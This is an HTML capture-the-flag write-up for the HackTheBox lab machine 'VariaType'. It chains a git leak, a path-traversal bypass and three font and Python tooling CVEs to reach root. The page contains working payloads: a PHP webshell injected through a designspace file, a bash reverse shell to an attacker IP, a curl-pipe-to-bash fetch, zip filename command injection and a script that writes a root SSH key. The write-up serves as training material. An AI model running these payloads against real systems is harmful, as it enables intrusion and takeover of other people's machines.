@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>VariaType — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+:root{--bg:#141d2b;--bg2:#1a2332;--bg3:#0f1620;--green:#9fef00;--red:#ff3e3e;--orange:#ffaf00;--blue:#2ea8e5;--purple:#a44eff;--text:#a4b1cd;--text-bright:#ffffff;--border:#2a3a52;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;font-size:16px;line-height:1.7;min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:1000;}
+header{background:var(--bg3);border-bottom:1px solid var(--border);padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:60px;position:sticky;top:0;z-index:100;}
+.logo{font-family:'Share Tech Mono',monospace;color:var(--green);font-size:1.2rem;letter-spacing:2px;text-decoration:none;}
+.logo span{color:var(--text);}
+.header-right{display:flex;gap:1.5rem;align-items:center;font-size:.85rem;color:var(--text);font-family:'Share Tech Mono',monospace;}
+.badge{padding:2px 10px;border-radius:3px;font-size:.75rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.badge-medium{background:var(--orange);color:#000;}
+.badge-linux{background:var(--bg2);border:1px solid var(--border);color:var(--text);}
+.badge-seasonal{background:var(--purple);color:#fff;}
+.container{max-width:1000px;margin:0 auto;padding:3rem 2rem;}
+.hero{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:2.5rem;margin-bottom:2.5rem;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue),var(--purple));}
+.hero-top{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:1rem;margin-bottom:1.5rem;}
+.machine-name{font-family:'Share Tech Mono',monospace;font-size:2.8rem;color:var(--text-bright);letter-spacing:3px;line-height:1;}
+.machine-name span{color:var(--green);}
+.badges{display:flex;gap:.5rem;flex-wrap:wrap;margin-top:.8rem;}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;}
+.stat{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:.8rem 1rem;}
+.stat-label{font-size:.7rem;text-transform:uppercase;letter-spacing:2px;color:var(--text);margin-bottom:.3rem;font-family:'Share Tech Mono',monospace;}
+.stat-value{font-size:1rem;color:var(--text-bright);font-family:'Share Tech Mono',monospace;}
+.stat-value.green{color:var(--green);}.stat-value.orange{color:var(--orange);}.stat-value.blue{color:var(--blue);}
+.chain{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.5rem 2rem;margin-bottom:2.5rem;font-family:'Share Tech Mono',monospace;font-size:.85rem;line-height:2;}
+.chain-title{color:var(--green);font-size:.75rem;letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;}
+.chain-step .arrow{color:var(--green);}.chain-step .cve{color:var(--blue);}.chain-step .user{color:var(--orange);font-weight:700;}
+.section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden;}
+.section-header{background:var(--bg3);border-bottom:1px solid var(--border);padding:1rem 1.5rem;display:flex;align-items:center;gap:1rem;}
+.section-num{width:28px;height:28px;background:var(--green);color:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;flex-shrink:0;}
+.section-title{font-size:1.1rem;font-weight:700;color:var(--text-bright);text-transform:uppercase;letter-spacing:1px;}
+.section-cve{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--blue);background:rgba(46,168,229,.1);border:1px solid rgba(46,168,229,.3);padding:2px 8px;border-radius:3px;}
+.section-body{padding:1.5rem;}
+p{margin-bottom:1rem;color:var(--text);font-size:1rem;}
+pre{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:1.2rem 1.5rem;overflow-x:auto;margin:1rem 0;position:relative;}
+pre::before{content:attr(data-label);position:absolute;top:.5rem;right:.8rem;font-family:'Share Tech Mono',monospace;font-size:.65rem;color:var(--text);opacity:.5;text-transform:uppercase;letter-spacing:1px;}
+code{font-family:'JetBrains Mono',monospace;font-size:.82rem;line-height:1.8;color:var(--text-bright);}
+.c-green{color:var(--green);}.c-orange{color:var(--orange);}.c-blue{color:var(--blue);}.c-red{color:var(--red);}.c-purple{color:var(--purple);}.c-dim{color:#546e8a;}
+.ic{font-family:'JetBrains Mono',monospace;font-size:.82rem;background:var(--bg3);border:1px solid var(--border);padding:1px 6px;border-radius:3px;color:var(--green);}
+.info-box{border-left:3px solid var(--blue);background:rgba(46,168,229,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;font-size:.9rem;}
+.success-box{border-left:3px solid var(--green);background:rgba(159,239,0,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.85rem;}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.9rem;}
+th{background:var(--bg3);color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:2px;padding:.7rem 1rem;text-align:left;border-bottom:1px solid var(--border);}
+td{padding:.7rem 1rem;border-bottom:1px solid var(--border);color:var(--text);}
+tr:last-child td{border-bottom:none;}tr:hover td{background:rgba(255,255,255,.02);}
+td:first-child{font-family:'Share Tech Mono',monospace;color:var(--blue);}
+h3{color:var(--text-bright);font-size:1rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin:1.5rem 0 .8rem;padding-bottom:.4rem;border-bottom:1px solid var(--border);}
+h3:first-child{margin-top:0;}
+/* Troll credentials */
+.cred{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--orange);cursor:pointer;border:1px dashed rgba(255,175,0,.5);padding:1px 8px;border-radius:3px;background:rgba(255,175,0,.06);user-select:none;transition:background .2s;}
+.cred:hover{background:rgba(255,175,0,.15);}
+/* Troll Modal */
+#troll-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;}
+.troll-inner{background:#1e2b3d;border:1px solid var(--green);border-radius:8px;padding:2.5rem;max-width:420px;width:90%;text-align:center;font-family:'Rajdhani',sans-serif;position:relative;overflow:hidden;}
+.troll-inner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue));}
+.troll-icon{font-size:3rem;margin-bottom:.5rem;}
+.troll-title{color:#fff;font-size:1.4rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+.troll-body{color:var(--text);font-size:.95rem;line-height:1.7;margin-bottom:1.5rem;}
+.troll-btn{padding:.6rem 2rem;background:var(--green);border:none;color:#000;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;}
+footer{text-align:center;padding:2rem;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:.75rem;border-top:1px solid var(--border);opacity:.5;}
+</style>
+</head>
+<body>
+
+<header>
+  <a href="../" class="logo">SKID<span>::</span>TUTS</a>
+  <div class="header-right">
+    <span>2026-03-14</span>
+    <span class="badge badge-seasonal">Seasonal</span>
+    <span class="badge badge-linux">Linux</span>
+    <span class="badge badge-medium">Medium</span>
+  </div>
+</header>
+
+<div class="container">
+  <div class="hero">
+    <div class="hero-top">
+      <div>
+        <div class="machine-name">VARIA<span>TYPE</span></div>
+        <div class="badges">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-seasonal">Seasonal S10</span>
+        </div>
+      </div>
+    </div>
+    <div class="stats-grid">
+      <div class="stat"><div class="stat-label">Target IP</div><div class="stat-value blue">10.129.7.223</div></div>
+      <div class="stat"><div class="stat-label">OS</div><div class="stat-value">Debian Linux</div></div>
+      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">22, 80</div></div>
+      <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">✓ Obtained</div></div>
+      <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">✓ Obtained</div></div>
+      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">3</div></div>
+    </div>
+  </div>
+
+  <div class="chain">
+    <div class="chain-title">// Attack Chain</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">→</span> .git leak on portal.variatype.htb <span class="arrow">→</span> <span class="cve">creds: gitbot</span></div>
+    <div class="chain-step"><span class="user">gitbot</span> <span class="arrow">→</span> <span class="cve">CVE-2025-66034</span> fonttools XML injection + path traversal <span class="arrow">→</span> PHP webshell</div>
+    <div class="chain-step"><span class="user">www-data</span> <span class="arrow">→</span> <span class="cve">CVE-2024-25082</span> fontforge zip filename injection via cron <span class="arrow">→</span> SSH key write</div>
+    <div class="chain-step"><span class="user">steve</span> <span class="arrow">→</span> <span class="cve">CVE-2025-47273</span> setuptools os.path.join absolute path bypass <span class="arrow">→</span> root SSH key</div>
+    <div class="chain-step"><span class="user">root</span> <span class="arrow">→</span> <span class="c-green">pwned ✓</span></div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">1</div><div class="section-title">Recon</div></div>
+    <div class="section-body">
+      <pre data-label="bash"><code><span class="c-green">$</span> echo <span class="c-orange">"10.129.7.223 variatype.htb portal.variatype.htb"</span> | sudo tee -a /etc/hosts
+<span class="c-green">$</span> nmap -sC -sV -oN nmap.txt 10.129.7.223</code></pre>
+      <pre data-label="output"><code>PORT   STATE SERVICE VERSION
+<span class="c-green">22/tcp open  ssh</span>     OpenSSH 9.2p1 Debian
+<span class="c-green">80/tcp open  http</span>    nginx 1.22.1
+|_http-title: VariaType Labs — Variable Font Generator</code></pre>
+      <p>Two virtual hosts: <span class="ic">variatype.htb</span> (Flask, variable font generator) and <span class="ic">portal.variatype.htb</span> (PHP font validation portal). Checking for an exposed git repo on the portal:</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s http://portal.variatype.htb/.git/HEAD
+<span class="c-dim">ref: refs/heads/master</span>
+<span class="c-green">$</span> pip install git-dumper && git-dumper http://portal.variatype.htb/.git git-repo
+<span class="c-green">$</span> cd git-repo && git log --oneline</code></pre>
+      <pre data-label="output"><code>753b5f5 fix: add gitbot user for automated validation pipeline
+5030e79 feat: initial portal implementation</code></pre>
+      <p>A dangling commit <span class="ic">security: remove hardcoded credentials</span> exists but was reset. Recover it:</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> git show 6f021da6be7086f2595befaa025a83d1de99478b</code></pre>
+      <div class="success-box">-$USERS = ['gitbot' => '<span class="cred" onclick="showTroll()">🔒 REDACTED</span>'];</div>
+      <p>Credentials recovered: <span class="ic">gitbot : <span class="cred" onclick="showTroll()">🔒 REDACTED</span></span></p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">2</div><div class="section-title">LFI via download.php</div></div>
+    <div class="section-body">
+      <p>After authenticating to the portal, <span class="ic">download.php</span> uses a single-pass <span class="ic">str_replace("../", "", $file)</span> filter. Bypassed using <span class="ic">....//</span> — the inner <span class="ic">../</span> is stripped, leaving a valid traversal sequence.</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -b <span class="c-orange">"PHPSESSID=..."</span> \
+  <span class="c-orange">"http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"</span></code></pre>
+      <pre data-label="php"><code><span class="c-dim">// download.php — vulnerable filter</span>
+$file = str_replace(<span class="c-orange">"../"</span>, <span class="c-orange">""</span>, $file); <span class="c-dim">// single-pass, bypassable with ....//</span>
+$filepath = <span class="c-orange">'/var/www/portal.variatype.htb/public/files/'</span> . $file;</code></pre>
+      <p>This lets us read the nginx config and confirm the webroot path: <span class="ic">/var/www/portal.variatype.htb/public/</span>. PHP executes files in the <span class="ic">/files/</span> subdirectory.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">3</div><div class="section-title">RCE as www-data</div><span class="section-cve">CVE-2025-66034</span></div>
+    <div class="section-body">
+      <p>The <span class="ic">variatype.htb</span> generator passes <span class="ic">.designspace</span> files to <span class="ic">fontTools.varLib</span> 4.50.0. Vulnerable to arbitrary file write via unsanitised <span class="ic">filename</span> attribute and XML injection via CDATA sections in <span class="ic">labelname</span> elements.</p>
+      <h3>Step 1 — Generate minimal TTF sources</h3>
+      <pre data-label="setup.py"><code><span class="c-blue">from</span> fontTools.fontBuilder <span class="c-blue">import</span> FontBuilder
+<span class="c-blue">from</span> fontTools.pens.ttGlyphPen <span class="c-blue">import</span> TTGlyphPen
+
+<span class="c-blue">def</span> <span class="c-green">create_font</span>(filename, weight=400):
+    fb = FontBuilder(unitsPerEm=<span class="c-orange">1000</span>, isTTF=<span class="c-blue">True</span>)
+    fb.setupGlyphOrder([<span class="c-orange">".notdef"</span>]); fb.setupCharacterMap({})
+    pen = TTGlyphPen(<span class="c-blue">None</span>)
+    pen.moveTo((<span class="c-orange">0,0</span>)); pen.lineTo((<span class="c-orange">500,0</span>)); pen.lineTo((<span class="c-orange">500,500</span>))
+    pen.lineTo((<span class="c-orange">0,500</span>)); pen.closePath()
+    fb.setupGlyf({<span class="c-orange">".notdef"</span>: pen.glyph()})
+    fb.setupHorizontalMetrics({<span class="c-orange">".notdef"</span>: (<span class="c-orange">500,0</span>)})
+    fb.setupHorizontalHeader(ascent=<span class="c-orange">800</span>, descent=<span class="c-orange">-200</span>)
+    fb.setupOS2(usWeightClass=weight); fb.setupPost()
+    fb.setupNameTable({<span class="c-orange">"familyName"</span>: <span class="c-orange">"Test"</span>, <span class="c-orange">"styleName"</span>: <span class="c-orange">"W"</span>})
+    fb.save(filename)
+
+create_font(<span class="c-orange">"source-light.ttf"</span>, weight=<span class="c-orange">100</span>)
+create_font(<span class="c-orange">"source-regular.ttf"</span>, weight=<span class="c-orange">400</span>)</code></pre>
+      <h3>Step 2 — Craft malicious designspace</h3>
+      <div class="info-box">The CDATA split <span class="ic">]]]]&gt;&lt;![CDATA[&gt;</span> breaks out of the XML context, allowing <span class="ic">?&gt;</span> to survive parsing and land verbatim in the written file.</div>
+      <pre data-label="malicious.designspace"><code>&lt;designspace format=<span class="c-orange">"5.0"</span>&gt;
+  &lt;axes&gt;
+    &lt;axis tag=<span class="c-orange">"wght"</span> name=<span class="c-orange">"Weight"</span> minimum=<span class="c-orange">"100"</span> maximum=<span class="c-orange">"900"</span> default=<span class="c-orange">"400"</span>&gt;
+      &lt;labelname xml:lang=<span class="c-orange">"en"</span>&gt;<span class="c-red">&lt;![CDATA[&lt;?php system($_GET["cmd"]); ?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;</span>&lt;/labelname&gt;
+    &lt;/axis&gt;
+  &lt;/axes&gt;
+  &lt;axis tag=<span class="c-orange">"wght"</span> name=<span class="c-orange">"Weight"</span> minimum=<span class="c-orange">"100"</span> maximum=<span class="c-orange">"900"</span> default=<span class="c-orange">"400"</span>/&gt;
+  &lt;sources&gt;
+    &lt;source filename=<span class="c-orange">"source-light.ttf"</span> name=<span class="c-orange">"Light"</span>&gt;
+      &lt;location&gt;&lt;dimension name=<span class="c-orange">"Weight"</span> xvalue=<span class="c-orange">"100"</span>/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+    &lt;source filename=<span class="c-orange">"source-regular.ttf"</span> name=<span class="c-orange">"Regular"</span>&gt;
+      &lt;location&gt;&lt;dimension name=<span class="c-orange">"Weight"</span> xvalue=<span class="c-orange">"400"</span>/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+  &lt;/sources&gt;
+  &lt;variable-fonts&gt;
+    &lt;variable-font name=<span class="c-orange">"MyFont"</span> filename=<span class="c-red">"/var/www/portal.variatype.htb/public/files/shell.php"</span>&gt;
+      &lt;axis-subsets&gt;&lt;axis-subset name=<span class="c-orange">"Weight"</span>/&gt;&lt;/axis-subsets&gt;
+    &lt;/variable-font&gt;
+  &lt;/variable-fonts&gt;
+&lt;/designspace&gt;</code></pre>
+      <h3>Step 3 — Upload and get shell</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
+  -F <span class="c-orange">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2044455349474e53504143451d604d414c4943494f55530e44455349474e5350414345">[email&#160;protected]</a>"</span> \
+  -F <span class="c-orange">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0e636f7d7a6b7c7d334e7d617b7c6d6b23626769667a207a7a68">[email&#160;protected]</a>"</span> \
+  -F <span class="c-orange">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80ede1f3f4e5f2f3bdc0f3eff5f2e3e5adf2e5e7f5ece1f2aef4f4e6">[email&#160;protected]</a>"</span>
+
+<span class="c-green">$</span> echo <span class="c-orange">'bash -i &gt;&amp; /dev/tcp/10.10.X.X/4444 0&gt;&amp;1'</span> &gt; rev.sh
+<span class="c-green">$</span> python3 -m http.server 8080
+<span class="c-green">$</span> rlwrap nc -lvnp 4444
+<span class="c-green">$</span> curl -s -b <span class="c-orange">"PHPSESSID=..."</span> \
+  <span class="c-orange">"http://portal.variatype.htb/files/shell.php?cmd=curl+10.10.X.X:8080/rev.sh|bash"</span></code></pre>
+      <div class="success-box">www-data@variatype:~/portal.variatype.htb/public/files$ id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">4</div><div class="section-title">www-data → steve</div><span class="section-cve">CVE-2024-25082</span></div>
+    <div class="section-body">
+      <p>pspy64 reveals a cron job running every minute as steve (UID=1000) that calls fontforge on all files in the upload directory. The bash script validates the archive filename against <span class="ic">'^[a-zA-Z0-9._-]+$'</span> — but CVE-2024-25082 exploits filenames <em>inside</em> the archive, which are never validated. FontForge passes internal filenames directly to <span class="ic">system()</span>.</p>
+      <pre data-label="exploit.py"><code><span class="c-blue">import</span> zipfile, subprocess
+
+pub_key = open(<span class="c-orange">"./steve_key.pub"</span>).read().strip()
+payload = (
+    <span class="c-orange">f'x$(mkdir -p /home/steve/.ssh &amp;&amp; '</span>
+    <span class="c-orange">f'echo "{pub_key}" &gt;&gt; /home/steve/.ssh/authorized_keys &amp;&amp; '</span>
+    <span class="c-orange">f'chmod 700 /home/steve/.ssh &amp;&amp; '</span>
+    <span class="c-orange">f'chmod 600 /home/steve/.ssh/authorized_keys).ttf'</span>
+)
+<span class="c-blue">with</span> zipfile.ZipFile(<span class="c-orange">'evil.zip'</span>, <span class="c-orange">'w'</span>) <span class="c-blue">as</span> z:
+    z.writestr(payload, <span class="c-blue">b</span><span class="c-orange">'\x00'</span> * <span class="c-orange">100</span>)</code></pre>
+      <pre data-label="bash"><code><span class="c-green">$</span> ssh-keygen -t ed25519 -f ./steve_key -N <span class="c-orange">""</span>
+<span class="c-green">$</span> python3 exploit.py && python3 -m http.server 8080
+<span class="c-dim"># From www-data shell:</span>
+<span class="c-green">$</span> curl http://10.10.X.X:8080/evil.zip -o /var/www/portal.variatype.htb/public/files/evil.zip
+<span class="c-dim"># Wait ~1 min for cron, then:</span>
+<span class="c-green">$</span> ssh -i ./steve_key <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aedddacbd8cbee9f9e809f9c978099809c9c9d">[email&#160;protected]</a></code></pre>
+      <div class="success-box">steve@variatype:~$ cat user.txt<br><span class="cred" onclick="showTroll()">🔒 REDACTED</span></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">5</div><div class="section-title">steve → root</div><span class="section-cve">CVE-2025-47273</span></div>
+    <div class="section-body">
+      <pre data-label="bash"><code>steve@variatype:~$ sudo -l
+<span class="c-green">(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</span></code></pre>
+      <p>The script uses <span class="ic">setuptools.PackageIndex().download()</span>. Python's <span class="ic">os.path.join()</span> discards all preceding path components when any component is absolute. The sanitiser only strips <span class="ic">..</span> sequences — not absolute paths. URL-encoding slashes as <span class="ic">%2F</span> bypasses any slash-count check while still decoding to <span class="ic">/</span>.</p>
+      <pre data-label="python"><code><span class="c-dim"># os.path.join() vulnerability:</span>
+os.path.join(<span class="c-orange">"/safe/dir"</span>, <span class="c-orange">"/root/.ssh/authorized_keys"</span>)
+<span class="c-dim"># Returns: "/root/.ssh/authorized_keys"  ← /safe/dir discarded!</span></code></pre>
+      <pre data-label="bash"><code><span class="c-dim"># Kali — serve SSH pubkey for any path</span>
+<span class="c-green">$</span> ssh-keygen -t ed25519 -f ./root_key -N <span class="c-orange">""</span>
+<span class="c-green">$</span> cat &gt; server.py <span class="c-orange">&lt;&lt; 'EOF'</span>
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        data = open('root_key.pub','rb').read()
+        self.send_response(200); self.send_header('Content-Length',len(data)); self.end_headers()
+        self.wfile.write(data)
+HTTPServer(('0.0.0.0',8888),H).serve_forever()
+<span class="c-orange">EOF</span>
+<span class="c-green">$</span> python3 server.py
+
+<span class="c-dim"># On target as steve:</span>
+steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  <span class="c-orange">"http://10.10.X.X:8888/%2Froot%2F.ssh%2Fauthorized_keys"</span>
+
+<span class="c-green">$</span> ssh -i ./root_key <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e5978a8a91a5d4d5cbd4d7dccbd2cbd7d7d6">[email&#160;protected]</a></code></pre>
+      <div class="success-box">root@variatype:~# cat root.txt<br><span class="cred" onclick="showTroll()">🔒 REDACTED</span></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num" style="background:var(--blue)">i</div><div class="section-title">CVE Summary</div></div>
+    <div class="section-body">
+      <table>
+        <tr><th>CVE</th><th>Component</th><th>Version</th><th>Impact</th></tr>
+        <tr><td>CVE-2025-66034</td><td>fontTools varLib</td><td>&lt; 4.60.2</td><td>Arbitrary file write + XML injection → webshell (www-data)</td></tr>
+        <tr><td>CVE-2024-25082</td><td>FontForge</td><td>&lt; 20240101</td><td>ZIP internal filename injection via system() → RCE as steve</td></tr>
+        <tr><td>CVE-2025-47273</td><td>setuptools PackageIndex</td><td>&lt; 78.1.1</td><td>os.path.join() absolute path bypass → write to /root/.ssh/</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+
+<div id="troll-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;">
+  <div class="troll-inner">
+    <div class="troll-icon">&#128064;</div>
+    <div class="troll-title">Really?</div>
+    <div class="troll-body">
+      The credentials are <strong style="color:var(--green)">inside the box</strong> &mdash; not in a writeup.<br><br>
+      Go find them yourself. That's literally the point. &#128526;
+    </div>
+    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I'll do it myself.</button>
+  </div>
+</div>
+<script>function showTroll(){document.getElementById('troll-modal').style.display='flex';}</script>
+
+<footer>
+  HackTheBox &middot; VariaType &middot; Seasonal S10 &middot; Medium &middot; Linux
+</footer>
+</body>
+</html>
